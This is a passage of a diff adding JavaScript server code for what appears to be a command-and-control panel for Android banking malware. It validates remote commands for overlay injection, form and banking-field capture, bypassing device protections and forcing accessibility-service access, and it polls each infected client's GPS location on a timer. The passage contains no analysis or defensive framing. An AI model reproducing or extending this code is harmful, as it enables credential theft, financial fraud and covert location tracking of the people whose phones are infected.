+      if (!validActions.includes(commandPayload.action))
+        return cb("OverlayInjection `action` parameter incorrect");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.customizedFormsCapture) {
+      if (!("action" in commandPayload))
+        return cb("CustomizedFormsCapture Missing `action` Parameter");
+      const validActions = [
+        "capture_field",
+        "submit_form",
+        "enable_realtime",
+        "disable_realtime",
+        "show_form",
+        "enable_bank",
+        "disable_bank",
+      ];
+      if (!validActions.includes(commandPayload.action))
+        return cb("CustomizedFormsCapture `action` parameter incorrect");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.bypassProtections) {
+      if (!("action" in commandPayload))
+        return cb("BypassProtections Missing `action` Parameter");
+      const validActions = [
+        "enable_bypass",
+        "disable_bypass",
+        "bypass_restricted_settings",
+        "force_accessibility_service",
+        "detect_protections",
+        "installation_method_update",
+      ];
+      if (!validActions.includes(commandPayload.action))
+        return cb("BypassProtections `action` parameter incorrect");
+      else cb(false);
+    } else if (Object.values(CONST.messageKeys).indexOf(commandID) >= 0)
+      return cb(false);
+    else return cb("Command ID Not Found");
+  }
+
+  gpsPoll(clientID) {
+    if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
+
+    let clientDB = this.getClientDatabase(clientID);
+    let gpsSettings = clientDB.get("GPSSettings").value();
+
+    if (gpsSettings.updateFrequency > 0) {
+      this.gpsPollers[clientID] = setInterval(() => {
+        logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - GPS");
+        this.sendCommand(clientID, "0xLO");
+      }, gpsSettings.updateFrequency * 1000);
+    }
+  }
+
+  setGpsPollSpeed(clientID, pollevery, cb) {
+    if (pollevery >= 30) {
+      let clientDB = this.getClientDatabase(clientID);
+      clientDB
+        .get("GPSSettings")
+        .assign({ updateFrequency: pollevery })
+        .write();
+      cb(false);
+      this.gpsPoll(clientID);
+    } else return cb("Polling Too Short!");
+  }
+}
+
+module.exports = Clients;
